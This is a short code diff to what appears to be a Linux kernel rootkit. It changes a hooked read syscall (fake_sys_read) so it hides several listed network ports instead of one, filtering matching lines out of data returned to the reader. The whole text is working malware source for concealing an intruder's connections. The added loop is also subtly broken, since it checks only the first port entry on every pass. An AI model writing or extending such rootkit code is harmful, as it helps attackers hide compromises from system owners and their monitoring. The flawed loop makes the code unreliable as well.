@@ -353,7 +353,7 @@ asmlinkage int fake_sys_open(const char *pathname, int flags)
 
 asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 {
-    int     i       = 0;
+    int     i = 0, j = 0, skip = 0;
     ssize_t ret     = 0;
     char *  p       = (char *)buf;
     char *  tok     = NULL;
@@ -379,8 +379,19 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
     {
         if(strlen(tok) == 0)
             continue;
-        else if(strstr(tok, hidden_port[0]))
+        for(j = 0; j < hidden_port_size; j++)
+        {
+            if(strstr(tok, hidden_port[0]))
+            {
+                skip = 1;
+                break;
+            }
+        }
+        if(skip)
+        {
+            skip = 0;
             continue;
+        }
 
         memcpy(tmp + offset, tok, strlen(tok));
         offset += strlen(tok);
